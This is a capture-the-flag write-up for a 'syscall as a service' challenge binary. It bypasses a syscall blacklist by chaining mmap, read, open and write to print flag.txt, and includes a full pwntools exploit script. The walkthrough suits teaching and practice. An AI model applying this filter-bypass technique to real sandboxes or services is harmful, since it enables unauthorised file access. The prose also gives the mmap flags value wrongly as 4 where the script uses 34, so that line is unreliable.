# [pwn] saas writeup

> You've heard of software as a service, but have you heard of syscall as a service?

In this challenge we have a binary that let us make syscalls with arbitrary parameters; before starting to dig into the code we can make some checks with checksec and with strings.
Checksec's output is:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
So this is not looking good, everything is enabled. Analyzing the binary with strings doesn't reveal nothing really important, so the next step is to execute the binary.

```
$ ./saas 
Welcome to syscall-as-a-service!

Enter rax (decimal): 0
Enter rdi (decimal): 0
Enter rsi (decimal): 0
Enter rdx (decimal): 0
Enter r10 (decimal): 0
Enter r9 (decimal): 0
Enter r8 (decimal): 0
Rax: 0x0
```
We are basically in a while true which lets us make syscalls with arbitrary parameters (and it shows us the return value). The first thing that came into my mind was to try and call execve, but the program will prevent us from calling some blacklisted syscalls (such as execve). The complete list of all the blocked syscall is: 0x3b, 0x39, 0x38, 0x3e, 0x65, 0xc8, 0x142.

## Solution

We cannot use execve, but we can still access many other syscalls. We can assume that this binary is in the same directory in which we have our flag.txt file, so (if this is true) we can try to *open* the file, *read* its contents and *write* them on stdout. In order to do that we can use 3 syscalls (obviously, open, read and write). But there is a little problem, to open a file we need its name, which is a string and which needs to be placed somewhere in the memory of the process, but since there's PIE we have no static addresses for r/w sections that we can possibly modify. After a bit of thinking, we can just allocate our own buffer using mmap, the address will be returned from the syscall, then we will write the string "flag.txt" (null terminated) on it and we can then open the file.

In C, what we want to do is as follow:

```
void* addr = mmap(0, 128, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
read(stdin, addr, 9);
int fd = open(addr, O_RDONLY, 0644);
read(fd, addr, 64);
write(stdout, addr, 64);
```

We have access to all this syscalls, we just need to convert our parameters to decimal:
```
PROT_READ|PROT_WRITE = 3
MAP_PRIVATE|MAP_ANONYMOUS = 4
0644 = 420 (0644 is octal)
stdin = 0
stdout = 1
```

## Code
At this point we just need a program that sends everything to the process' stdin, we just need to capture the retval of the mmap (for the address) and the retval of the open (for the file descriptor).
The program is (in python) as follow (in this directory you will find the .py file):
from pwn import *
```
#p = remote("jh2i.com", 50016)

p = gdb.debug("./saas", """
c
""")


#mmap
p.sendline("9")		#rax
p.sendline("0")		#rdi
p.sendline("128")	#rsi
p.sendline("3")		#rdx
p.sendline("34")	#r10
p.sendline("0")		#r9
p.sendline("-1")	#r8

p.recvuntil("Rax: 0x")
addr = str(p.recvuntil("\n")[:-1])[2:-1]
addr = str(int(addr,16))
print("Heap address ="+addr)

#read
p.sendline("0")		#rax
p.sendline("0")		#rdi
p.sendline(addr)	#rsi
p.sendline("9")		#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8
p.sendline("flag.txt"+'\x00')
p.recvuntil("Rax: 0x")

#open
p.sendline("2")		#rax
p.sendline(addr)	#rdi
p.sendline("0")		#rsi
p.sendline("420")	#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8

p.recvuntil("Rax: 0x")
fd = str(p.recvuntil("\n")[:-1])[2:-1]
fd = str(int(fd,16))
print("File descriptor ="+fd)

#read
p.sendline("0")		#rax
p.sendline(fd)		#rdi
p.sendline(addr)	#rsi
p.sendline("64")	#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8
p.recvuntil("Rax: 0x")

#write
p.sendline("1")		#rax
p.sendline("1")		#rdi
p.sendline(addr)	#rsi
p.sendline("64")	#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8
p.recvuntil("r8 (decimal):")	#we can't read untill "Rax: 0x" because the flag is printed before that happen


p.interactive()
```
